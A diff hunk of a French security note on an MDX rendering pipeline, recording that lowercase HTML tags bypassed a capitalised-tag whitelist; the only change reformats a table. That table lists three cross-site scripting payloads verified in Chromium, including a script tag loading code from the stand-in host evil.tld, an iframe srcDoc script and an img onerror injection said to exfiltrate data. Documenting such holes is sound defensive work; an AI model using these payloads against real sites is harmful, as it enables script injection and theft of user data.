@@ -11,7 +11,7 @@ Tension découverte à l'usage (2026-07-16) : le `blockJS` de `next-mdx-remote`,
 **Angle mort découvert (2026-07-17) : le bridage ne regardait que le JS.** Le registre met en liste blanche les balises à **majuscule** ; les balises HTML en **minuscule** n'étaient filtrées par rien et partaient telles quelles à React. Vérifié dans un vrai Chromium, sur `/api/render` :
 
 | Charge | Constat |
-|---|---|
+| --- | --- |
 | `<script src="https://evil.tld/x.js" />` | JS tiers **chargé et exécuté** |
 | `<iframe srcDoc="<script>…</script>" />` | **exécuté sur notre propre origine** (un `srcdoc` hérite de l'origine du document qui l'embarque) |
 | `<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=…>'}} />` | **exécuté** + exfiltration vers un hôte tiers |
